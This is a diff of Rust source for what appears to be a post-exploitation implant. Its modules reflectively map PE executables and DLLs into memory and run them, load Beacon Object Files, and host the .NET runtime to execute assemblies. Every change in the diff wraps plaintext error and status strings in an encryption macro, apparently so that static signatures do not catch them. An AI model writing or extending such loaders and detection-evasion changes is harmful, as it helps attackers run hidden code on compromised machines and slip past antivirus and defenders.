@@ -337,7 +337,7 @@ pub mod pe_loader {
                         if h_module.is_null() {
                             let name_str = dll_name.to_string_lossy();
                             VirtualFree(base, 0, ffi.mem_release);
-                            return Err(format!("Failed to load dependency: {}", name_str));
+                            return Err(format!("{}: {}", aes_str!("Failed to load dependency"), name_str));
                         }
 
                         let mut thunk_offset = 0usize;
@@ -410,7 +410,7 @@ pub mod pe_loader {
                             // a null-pointer dereference crash when the PE calls that API.
                             if func_addr.is_null() {
                                 let name_info = if olt_entry & (1u64 << 63) != 0 {
-                                    format!("ordinal {}", olt_entry & 0xFFFF)
+                                    format!("{} {}", aes_str!("ordinal"), olt_entry & 0xFFFF)
                                 } else {
                                     match (olt_entry as usize).checked_add(2) {
                                         Some(r) => match cstr_in_image(base as *const u8, image_size, r) {
@@ -422,7 +422,7 @@ pub mod pe_loader {
                                 };
                                 let dll_str = dll_name.to_string_lossy();
                                 VirtualFree(base, 0, ffi.mem_release);
-                                return Err(format!("Import resolution failed: {}!{}", dll_str, name_info));
+                                return Err(format!("{}: {}!{}", aes_str!("Import resolution failed"), dll_str, name_info));
                             }
 
                             // Patch the IAT - the write target is validated
@@ -480,7 +480,7 @@ pub mod pe_loader {
         // 7. Call entry point
         let entry_rva = nt.optional_header.address_of_entry_point as usize;
         if entry_rva == 0 {
-            return Ok(format!("PE mapped at 0x{:X} (no entry point)", base as usize));
+            return Ok(format!("{} 0x{:X} {}", aes_str!("PE mapped at"), base as usize, aes_str!("(no entry point)")));
         }
         // A hostile AddressOfEntryPoint would otherwise make us call memory
         // outside the mapped image.
@@ -497,7 +497,7 @@ pub mod pe_loader {
             type DllMain = unsafe extern "system" fn(*mut c_void, u32, *mut c_void) -> i32;
             let dll_main: DllMain = mem::transmute(entry_addr);
             let result = dll_main(base, 1, ptr::null_mut());
-            Ok(format!("DLL loaded at 0x{:X}, DllMain returned {}", base as usize, result))
+            Ok(format!("{} 0x{:X}, {} {}", aes_str!("DLL loaded at"), base as usize, aes_str!("DllMain returned"), result))
         } else {
             // EXE: run entry on a new thread.
             // Process-terminating functions (ExitProcess, exit, _exit, abort, etc.)
@@ -529,7 +529,7 @@ pub mod pe_loader {
                 }
             });
 
-            Ok(format!("EXE mapped at 0x{:X} ({}KB), entry thread spawned", base_copy, image_size / 1024))
+            Ok(format!("{} 0x{:X} ({}KB), {}", aes_str!("EXE mapped at"), base_copy, image_size / 1024, aes_str!("entry thread spawned")))
         }
     }
 }
@@ -919,8 +919,8 @@ pub mod bof {
                     // field `reloc.virtual_address` directly (as format! does)
                     // is E0793 undefined behavior.
                     return Err(format!(
-                        "BOF relocation site out of bounds: section {} rva 0x{:X}",
-                        i + 1, patch_rva
+                        "{}: {} {} rva 0x{:X}",
+                        aes_str!("BOF relocation site out of bounds"), aes_str!("section"), i + 1, patch_rva
                     ));
                 }
                 let patch_site = sec_base.add(patch_rva);
@@ -957,9 +957,9 @@ pub mod bof {
                             } else {
                                 VirtualFree(base, 0, ffi.mem_release);
                                 return Err(format!(
-                                    "BOF relocation failed: trampoline table exhausted ({} used). \
-                                     Target 0x{:X} is >2GB from BOF at 0x{:X}.",
-                                    MAX_TRAMPOLINES, sym_addr, base as u64
+                                    "{} ({} {}). {} 0x{:X} {} 0x{:X}.",
+                                    aes_str!("BOF relocation failed: trampoline table exhausted"), MAX_TRAMPOLINES, aes_str!("used"),
+                                    aes_str!("Target"), sym_addr, aes_str!("is >2GB from BOF at"), base as u64
                                 ));
                             }
                         }
@@ -1056,7 +1056,7 @@ pub mod bof {
     fn resolve_bof_import(name: &str) -> Option<u64> {
         let stripped = name.strip_prefix(&aes_str!("__imp_"))?;
         let (lib, func) = stripped.split_once('$')?;
-        let lib_cstr = std::ffi::CString::new(format!("{}.dll", lib)).ok()?;
+        let lib_cstr = std::ffi::CString::new(format!("{}{}", lib, aes_str!(".dll"))).ok()?;
         let func_cstr = std::ffi::CString::new(func).ok()?;
         unsafe {
             let h = LoadLibraryA(lib_cstr.as_ptr());
@@ -1082,6 +1082,7 @@ pub mod bof {
 
 #[cfg(target_os = "windows")]
 pub mod dotnet {
+    use super::{aes_str, strcrypt_rt};
     use std::ffi::c_void;
     use std::ptr;
 
@@ -1147,7 +1148,7 @@ pub mod dotnet {
         // 1. Create ICLRMetaHost
         let mut meta_host: *mut c_void = ptr::null_mut();
         let hr = CLRCreateInstance(&CLSID_CLR_META_HOST, &IID_ICLR_META_HOST, &mut meta_host);
-        if hr < 0 { return Err(format!("CLRCreateInstance failed: 0x{:08X}", hr)); }
+        if hr < 0 { return Err(format!("{}: 0x{:08X}", aes_str!("CLRCreateInstance failed"), hr)); }
 
         // Convert strings to wide (UTF-16)
         let runtime_ver_wide: Vec<u16> = runtime_version.encode_utf16().chain(std::iter::once(0)).collect();
@@ -1165,7 +1166,7 @@ pub mod dotnet {
 
         let mut runtime_info: *mut c_void = ptr::null_mut();
         let hr = get_runtime(meta_host, runtime_ver_wide.as_ptr(), &IID_ICLR_RUNTIME_INFO, &mut runtime_info);
-        if hr < 0 { return Err(format!("GetRuntime failed: 0x{:08X}", hr)); }
+        if hr < 0 { return Err(format!("{}: 0x{:08X}", aes_str!("GetRuntime failed"), hr)); }
 
         // 3. Get ICLRRuntimeHost via ICLRRuntimeInfo::GetInterface
         //    vtable index 9
@@ -1176,14 +1177,14 @@ pub mod dotnet {
 
         let mut runtime_host: *mut c_void = ptr::null_mut();
         let hr = get_interface(runtime_info, &CLSID_CLR_RUNTIME_HOST, &IID_ICLR_RUNTIME_HOST, &mut runtime_host);
-        if hr < 0 { return Err(format!("GetInterface failed: 0x{:08X}", hr)); }
+        if hr < 0 { return Err(format!("{}: 0x{:08X}", aes_str!("GetInterface failed"), hr)); }
 
         // 4. Start the CLR
         let rh_vtable = *(runtime_host as *const *const *const c_void);
         let start: unsafe extern "system" fn(*mut c_void) -> HRESULT = std::mem::transmute(*rh_vtable.add(3));
         let hr = start(runtime_host);
         if hr < 0 && hr != 1 { // 1 = already started
-            return Err(format!("CLR Start failed: 0x{:08X}", hr));
+            return Err(format!("{}: 0x{:08X}", aes_str!("CLR Start failed"), hr));
         }
 
         // 5. ExecuteInDefaultAppDomain (vtable index 11)
@@ -1202,9 +1203,9 @@ pub mod dotnet {
         );
 
         if hr < 0 {
-            Err(format!("ExecuteInDefaultAppDomain failed: 0x{:08X}", hr))
+            Err(format!("{}: 0x{:08X}", aes_str!("ExecuteInDefaultAppDomain failed"), hr))
         } else {
-            Ok(format!(".NET assembly executed, return value: {}", return_value))
+            Ok(format!("{}: {}", aes_str!(".NET assembly executed, return value"), return_value))
         }
     }
 }
